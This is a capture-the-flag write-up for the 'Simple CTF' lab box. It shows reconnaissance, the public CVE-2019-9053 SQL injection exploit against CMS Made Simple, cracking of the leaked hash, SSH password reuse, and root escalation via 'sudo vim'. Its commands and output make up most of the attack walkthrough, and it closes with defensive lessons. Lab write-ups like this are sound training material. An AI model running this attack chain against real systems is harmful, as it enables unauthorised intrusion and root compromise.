# Simple CTF

**Difficulty:** Easy
**Techniques:** CMS Made Simple SQLi (CVE-2019-9053) · offline hash crack · `sudo vim` privesc

## Recon
```bash
nmap -sS -sV -p- -oN portscan.nmap <ip>
```
```
21/tcp   open  ftp     vsftpd 3.0.3        (anonymous login allowed)
80/tcp   open  http    Apache 2.4.18       (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2
```
SSH on a non-standard port (2222) — worth remembering for later.

## Enumeration
```bash
gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
`/simple/` → **CMS Made Simple 2.2.8**.

```bash
searchsploit "CMS Made Simple 2.2.8"
# CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py  (CVE-2019-9053)
searchsploit -m 46635
```

## Exploitation — SQL injection (CVE-2019-9053)
The exploit is Python 2; patched the `print`/`cprint` calls to run it, then:
```bash
python2 46635.py -u http://<ip>/simple --crack -w /usr/share/wordlists/rockyou.txt
```
```
[+] Salt found / Username found: mitch / Email: admin@admin.com
[+] Password hash found ... [+] Password cracked: secret
```
Blind SQLi in the CMS leaks the admin user, salt and password hash; the exploit
cracks it against rockyou → `mitch : secret`.

## Foothold
Credential reuse against SSH (port 2222):
```bash
ssh mitch@<ip> -p 2222      # password: secret
```
`user.txt` captured.

## Privilege escalation — sudo vim
```bash
sudo -l
#   (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
```
`vim` can spawn a shell; run as root via sudo → **root**. `root.txt` captured.
(GTFOBins: `vim` is a classic sudo-abuse binary.)

## Lessons
- Outdated CMS with a public CVE = instant foothold — patch management matters.
- Password reuse (web → SSH) turns one leak into shell access.
- `NOPASSWD` on an interactive binary (`vim`) is a direct root path — never grant
  sudo to editors/pagers.
